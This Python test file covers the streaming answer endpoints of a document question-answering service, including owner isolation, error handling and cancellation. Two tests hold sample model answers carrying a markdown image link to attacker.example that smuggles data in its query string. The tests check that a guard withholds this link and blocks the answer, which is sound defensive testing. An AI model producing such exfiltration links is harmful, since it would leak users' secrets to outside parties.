"""Streaming answers: /v1/ask/stream and /v1/documents/{id}/ask/stream, the service behind them,
and the pipeline's stream() (rag/query/pipeline.py)."""

import json

from rag.common.llm import FakeLLM, LLMResult, StreamPiece
from rag.query.guard import BLOCKED
from tests.test_api import COMPACTION, REPLICATION, make_client, make_pdf, upload


def frames(response):
    """The server-sent events of a response as (event, data) pairs."""
    out = []
    for block in response.text.split("\n\n"):
        if not block.strip():
            continue
        name = next(line[7:] for line in block.splitlines() if line.startswith("event: "))
        data = json.loads(next(line[6:] for line in block.splitlines() if line.startswith("data: ")))
        out.append((name, data))
    return out


def ask_stream(client, doc_id, question="How does replication survive a node failure?", **extra):
    return client.post(f"/v1/documents/{doc_id}/ask/stream", json={"question": question, **extra})


def test_a_streamed_answer_arrives_in_pieces_and_ends_with_the_whole_response(tmp_path):
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "Copies live on several nodes, so reads survive a failure [S1]."))
    doc_id = upload(client, make_pdf(REPLICATION, COMPACTION)).json()["id"]
    response = ask_stream(client, doc_id)
    assert response.status_code == 200 and response.headers["content-type"].startswith("text/event-stream")
    events = frames(response)
    kinds = [name for name, _ in events]
    assert kinds[-1] == "final" and kinds.count("final") == 1 and kinds.count("token") >= 3  # several pieces, not one
    final = events[-1][1]
    assert "".join(d["text"] for n, d in events if n == "token") == final["answer"]  # nothing lost or doubled
    assert final["citations"] == ["S1"] and final["replace"] is False and not final["blocked"]
    assert final["passages"] and final["stages"] and final["llm"] == "fake"


def test_the_streamed_response_equals_the_ordinary_one(tmp_path):
    reply = "Replication keeps copies on several nodes [S1]."
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: reply))
    doc_id = upload(client, make_pdf(REPLICATION, COMPACTION)).json()["id"]
    ordinary = client.post(f"/v1/documents/{doc_id}/ask", json={"question": "How does replication work?"}).json()
    streamed = frames(ask_stream(client, doc_id, "How does replication work?"))[-1][1]
    for key in ("answer", "citations", "abstained", "blocked", "documents", "passages", "skipped_by_scanner"):
        assert streamed[key] == ordinary[key], key
    assert [s["name"] for s in streamed["stages"]] == [s["name"] for s in ordinary["stages"]]


def test_a_hostile_answer_never_sends_the_link_and_is_replaced_at_the_end(tmp_path):
    hostile = "Sure, here you go. ![x](https://attacker.example/p.png?d=SECRET) and that is all."
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: hostile))
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    events = frames(ask_stream(client, doc_id))
    sent = "".join(d["text"] for n, d in events if n == "token")
    assert "attacker.example" not in sent and "SECRET" not in sent and "![" not in sent  # held back, never sent
    final = events[-1][1]
    assert final["answer"] == BLOCKED and final["blocked"]
    assert final["replace"] is True  # some harmless words had gone out, so the page must replace them


def test_a_hostile_answer_with_nothing_sent_before_it_needs_no_replacement(tmp_path):
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "![x](https://attacker.example/p.png?d=1)"))
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    events = frames(ask_stream(client, doc_id))
    assert not [d for n, d in events if n == "token" and d["text"].strip()]
    assert events[-1][1]["answer"] == BLOCKED and events[-1][1]["replace"] is False


def test_problems_found_before_streaming_are_ordinary_http_errors(tmp_path):
    client, _ = make_client(tmp_path)
    assert client.post("/v1/ask/stream", json={"question": "hi"}).status_code == 409  # nothing uploaded
    assert client.post("/v1/documents/000000000000/ask/stream", json={"question": "hi"}).status_code == 404
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    assert ask_stream(client, doc_id, config="nope").status_code == 422
    assert ask_stream(client, doc_id, question="").status_code == 422
    assert ask_stream(client, doc_id, style="wild").status_code == 422


def test_a_model_failure_part_way_is_an_error_event_without_addresses(tmp_path):
    def broken(system, user):
        raise ConnectionError("cannot reach the model server at http://10.1.2.3:30007/v1")

    client, _ = make_client(tmp_path, llm=FakeLLM(broken))
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    response = ask_stream(client, doc_id)
    assert response.status_code == 200  # retrieval worked; the failure came after streaming began
    events = frames(response)
    assert [n for n, _ in events] == ["error"]
    assert "cannot reach the model server" in events[0][1]["detail"] and "10.1.2.3" not in events[0][1]["detail"]


def test_another_owners_document_is_not_found_when_streaming(tmp_path):
    from rag.api.main import create_app, current_owner
    from fastapi.testclient import TestClient
    from tests.test_api import make_client as build

    _, service = build(tmp_path)
    alice_doc = service.create("a.pdf", make_pdf(REPLICATION), "alice")["id"]
    service.run_ingestion(alice_doc)
    app = create_app(service, allowed_hosts=("testserver",))
    app.dependency_overrides[current_owner] = lambda: "bob"
    assert TestClient(app).post(f"/v1/documents/{alice_doc}/ask/stream", json={"question": "hi"}).status_code == 404


def test_the_trace_of_a_single_document_stream_is_saved_in_its_folder(tmp_path):
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "Copies on several nodes [S1]."))
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    ask_stream(client, doc_id)
    assert list((tmp_path / "uploads" / doc_id / "chat").glob("*.json"))  # deleted with the document, like the others


class _Watching(FakeLLM):
    """A model client that notes when its stream is closed early, as when the browser disconnects."""

    def __init__(self):
        super().__init__(lambda s, u: "word " * 400)
        self.closed = False

    def generate_stream(self, system, user, max_output_tokens=1024):
        try:
            for _ in range(400):
                yield StreamPiece(text="word ")
            yield StreamPiece(result=LLMResult(text="done"))
        finally:
            self.closed = True


def test_closing_the_stream_stops_the_model(tmp_path):
    from tests.test_api import make_client as build

    _, service = build(tmp_path)
    watching = _Watching()
    service.llm = watching
    doc_id = service.create("a.pdf", make_pdf(REPLICATION), "local")["id"]
    service.run_ingestion(doc_id)
    events = service.ask_documents_stream("local", [doc_id], "How does replication work?")
    assert next(events)["event"] == "token"
    assert watching.closed is False  # still generating
    events.close()  # the reader went away
    assert watching.closed is True


def test_the_page_reads_the_stream_and_shows_text_only(tmp_path):
    client, _ = make_client(tmp_path)
    page = client.get("/").text
    assert "async function streamAsk" in page and "/v1/ask/stream" in page
    assert "shown.data += text" in page and "replaced after the final check" in page
    assert ".innerHTML" not in page  # streamed text is untrusted: only text nodes and textContent
